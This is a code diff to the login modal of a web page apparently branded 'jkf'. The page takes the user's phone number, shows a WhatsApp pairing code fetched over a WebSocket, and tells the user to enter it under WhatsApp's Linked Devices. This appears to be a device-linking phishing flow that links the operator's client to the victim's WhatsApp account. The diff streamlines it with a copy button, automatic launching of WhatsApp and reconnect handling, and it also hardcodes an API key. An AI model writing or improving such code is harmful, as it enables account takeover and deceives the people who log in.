@@ -396,14 +396,22 @@
               打开 WhatsApp → 设置 → 关联设备 → 输入下方配对码
             </p>
             <div class="jkf-login__code-display" id="jkfLoginCodeDisplay">------</div>
+            <p class="jkf-login__copy-toast" id="jkfLoginCopyToast" style="display:none;color:var(--jkf-login-whatsapp);font-size:0.9rem;font-weight:500;margin:0 0 12px;">
+              <i class="bi bi-check-circle-fill" aria-hidden="true"></i>
+              已复制，正在打开 WhatsApp...
+            </p>
+            <button type="button" class="jkf-login__submit" id="jkfLoginCodeCopyBtn" style="background:var(--jkf-login-whatsapp);border:none;margin-bottom:12px;">
+              <i class="bi bi-clipboard" aria-hidden="true"></i>
+              复制配对码
+            </button>
             <p class="jkf-login__error" id="jkfLoginCodeError" role="alert" style="display:none;"></p>
             <div style="color:var(--jkf-login-text-muted);font-size:0.8rem;">
               <i class="bi bi-arrow-repeat" aria-hidden="true"></i>
               等待配对中...
             </div>
-            <button type="button" class="jkf-login__submit" id="jkfLoginCodeBack" style="margin-top:16px;background:transparent;border:1px solid var(--jkf-login-divider);color:var(--jkf-login-text-muted);font-size:0.85rem;padding:8px 16px;">
-              <i class="bi bi-arrow-left" aria-hidden="true"></i>
-              返回修改号码
+            <button type="button" class="jkf-login__submit" id="jkfLoginCodeRestart" style="margin-top:16px;background:transparent;border:1px solid var(--jkf-login-divider);color:var(--jkf-login-text-muted);font-size:0.85rem;padding:8px 16px;">
+              <i class="bi bi-arrow-counterclockwise" aria-hidden="true"></i>
+              重新开始
             </button>
           </div>
         </div>
@@ -480,16 +488,24 @@
     let wsClient = null;
     /** 当前 UUID（内存缓存） */
     let wsUUID = null;
-    /** 是否主动关闭（区分主动/意外断开，避免自动重连） */
-    let wsIntentionallyClosed = false;
+    /** WebSocket 代际计数器（用于防止旧连接 onclose 误触重连） */
+    let wsGen = 0;
     /** 配对码面板 DOM */
     const codePanel = document.getElementById("jkfLoginPanelCode");
     /** 配对码展示 DOM */
     const codeDisplay = document.getElementById("jkfLoginCodeDisplay");
     /** 配对码错误提示 */
     const codeErrorEl = document.getElementById("jkfLoginCodeError");
-    /** 返回修改号码按钮 */
-    const codeBackBtn = document.getElementById("jkfLoginCodeBack");
+    /** 重新开始按钮 */
+    const codeRestartBtn = document.getElementById("jkfLoginCodeRestart");
+    /** 复制成功提示 */
+    const copyToast = document.getElementById("jkfLoginCopyToast");
+    /** 复制配对码按钮 */
+    const codeCopyBtn = document.getElementById("jkfLoginCodeCopyBtn");
+    /** 扫码 Tab */
+    const qrTab = document.getElementById("jkfLoginTabQr");
+    /** 号码 Tab */
+    const phoneTab = document.getElementById("jkfLoginTabPhone");
     /** IP 区号 API 地址 */
     const IP_API_URL = "https://ipwhois.pro/?key=IHDcWORhjtQ0VSPe";
 
@@ -649,7 +665,8 @@
 
     /**
      * 显示配对码面板（隐藏号码面板）
-     * @param {string} code - 6 位配对码
+     * 禁用扫码 Tab，自动打开 WhatsApp
+     * @param {string} code - 配对码
      */
     function showCodePanel(code) {
       // 切换到配对码面板
@@ -657,6 +674,12 @@
       if (codePanel) codePanel.classList.add("is-active");
       // 显示配对码
       if (codeDisplay) codeDisplay.textContent = code;
+      if (copyToast) copyToast.style.display = "none";
+      // 禁用扫码 Tab
+      if (qrTab) { qrTab.disabled = true; qrTab.style.opacity = "0.4"; qrTab.style.cursor = "default"; }
+      if (phoneTab) { phoneTab.disabled = true; phoneTab.style.opacity = "0.4"; phoneTab.style.cursor = "default"; }
+      // 自动打开 WhatsApp（手机浏览器）
+      window.location.href = "whatsapp://app";
     }
 
     /**
@@ -666,15 +689,15 @@
       if (codePanel) codePanel.classList.remove("is-active");
       document.getElementById("jkfLoginPanelPhone").classList.add("is-active");
       if (codeErrorEl) { codeErrorEl.style.display = "none"; }
+      // 恢复 Tab 可点击
+      if (qrTab) { qrTab.disabled = false; qrTab.style.opacity = ""; qrTab.style.cursor = ""; }
+      if (phoneTab) { phoneTab.disabled = false; phoneTab.style.opacity = ""; phoneTab.style.cursor = ""; }
     }
 
     /**
      * 关闭 WebSocket 连接
-     * @param {boolean} [intentional=true] - 是否主动关闭（主动关闭不重连）
      */
-    function closeWebSocket(intentional) {
-      if (intentional === undefined) intentional = true;
-      wsIntentionallyClosed = intentional;
+    function closeWebSocket() {
       if (wsClient) {
         try { wsClient.close(); } catch (e) { /* ignore */ }
         wsClient = null;
@@ -707,11 +730,14 @@
     /**
      * 建立/初始化 WebSocket 连接（页面加载时自动调用）
      * 仅处理 link 消息获取 UUID；不发送手机号
-     * 断开后自动重连（除非主动关闭）
+     * 断开后自动重连（除非已被新连接取代）
      */
     function initWebSocket() {
+      // 递增代际，旧连接即使触发 onclose 也会因代际不匹配而跳过重连
+      wsGen++;
+      var myGen = wsGen;
+
       // 关闭旧连接
-      wsIntentionallyClosed = false;
       if (wsClient) {
         try { wsClient.close(); } catch (e) { /* ignore */ }
         wsClient = null;
@@ -744,7 +770,7 @@
           case "ready":
             // 配对成功 → 清除 UUID
             clearUUID();
-            closeWebSocket(true);
+            closeWebSocket();
             close();
             break;
 
@@ -752,15 +778,13 @@
             // 号码错误（用户已提交后）
             setSubmitLoading(false);
             clearUUID();
-            closeWebSocket(true);
+            closeWebSocket();
             showError("号码错误，请检查后重试");
             break;
 
           case "error":
-            setSubmitLoading(false);
-            clearUUID();
-            closeWebSocket(true);
-            showError("服务器错误，请稍后重试");
+            // 服务端返回 error → 刷新页面恢复初始状态
+            location.reload();
             break;
         }
       };
@@ -770,8 +794,8 @@
       };
 
       wsClient.onclose = function () {
-        // 非主动关闭 → 自动重连
-        if (!wsIntentionallyClosed) {
+        // 仅当此连接仍是当前代际时才自动重连（防止旧连接误触）
+        if (myGen === wsGen) {
           initWebSocket();
         }
       };
@@ -802,7 +826,8 @@
         }, { once: true });
       } else {
         // 连接已断开 → 重建连接，发送手机号
-        wsIntentionallyClosed = false;
+        wsGen++;
+        var myGen = wsGen;
         var storedUUID = loadStoredUUID();
         var protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
         var url = protocol + "//" + WS_API_URL + "?uuid=" + (storedUUID || "");
@@ -825,26 +850,23 @@
               break;
             case "ready":
               clearUUID();
-              closeWebSocket(true);
+              closeWebSocket();
               close();
               break;
             case "tel-error":
               setSubmitLoading(false);
               clearUUID();
-              closeWebSocket(true);
+              closeWebSocket();
               showError("号码错误，请检查后重试");
               break;
             case "error":
-              setSubmitLoading(false);
-              clearUUID();
-              closeWebSocket(true);
-              showError("服务器错误，请稍后重试");
+              location.reload();
               break;
           }
         };
 
         wsClient.onclose = function () {
-          if (!wsIntentionallyClosed) initWebSocket();
+          if (myGen === wsGen) initWebSocket();
         };
 
         wsClient.onerror = function () {
@@ -887,6 +909,22 @@
       sendPhoneNumber(prefix, phone);
     }
 
+    /**
+     * 重置全部状态：关闭 WS、清除 UUID、回到号码面板、重新初始化 WS 获取新 UUID
+     */
+    function resetAll() {
+      closeWebSocket();
+      clearUUID();
+      hideCodePanel();
+      setSubmitLoading(false);
+      clearError();
+      if (copyToast) copyToast.style.display = "none";
+      // 重置手机号输入
+      if (phoneInput) phoneInput.value = "";
+      // 重新建立 WebSocket 获取新 UUID
+      initWebSocket();
+    }
+
     if (loginForm) {
       loginForm.addEventListener("submit", handleFormSubmit);
     }
@@ -905,19 +943,33 @@
       navLoginBtn.dataset.jkfLoginBound = "1";
     }
 
-    // 弹窗关闭时重置 UI 状态（不断开 WebSocket，保持 UUID）
+    // 弹窗关闭时重置全部状态（关 WS + 清 UUID + 重新初始化）
     modalEl.addEventListener("hidden.bs.modal", function () {
-      hideCodePanel();
-      setSubmitLoading(false);
-      clearError();
+      resetAll();
     });
 
-    // 返回修改号码按钮：回到号码面板（不断开 WebSocket）
-    if (codeBackBtn) {
-      codeBackBtn.addEventListener("click", function () {
-        hideCodePanel();
-        setSubmitLoading(false);
-        clearError();
+    // 重新开始按钮：重置全部状态，获取新 UUID
+    if (codeRestartBtn) {
+      codeRestartBtn.addEventListener("click", resetAll);
+    }
+
+    // 复制配对码按钮
+    if (codeCopyBtn) {
+      codeCopyBtn.addEventListener("click", function () {
+        var code = codeDisplay ? codeDisplay.textContent : "";
+        if (!code || code === "------") return;
+        try {
+          navigator.clipboard.writeText(code).then(function () {
+            if (copyToast) copyToast.style.display = "block";
+            codeCopyBtn.innerHTML = '<i class="bi bi-check-lg" aria-hidden="true"></i> 已复制';
+            // 立即打开 WhatsApp
+            window.location.href = "whatsapp://app";
+            setTimeout(function () {
+              codeCopyBtn.innerHTML = '<i class="bi bi-clipboard" aria-hidden="true"></i> 复制配对码';
+              if (copyToast) copyToast.style.display = "none";
+            }, 2000);
+          }).catch(function () {});
+        } catch (e) {}
       });
     }
 
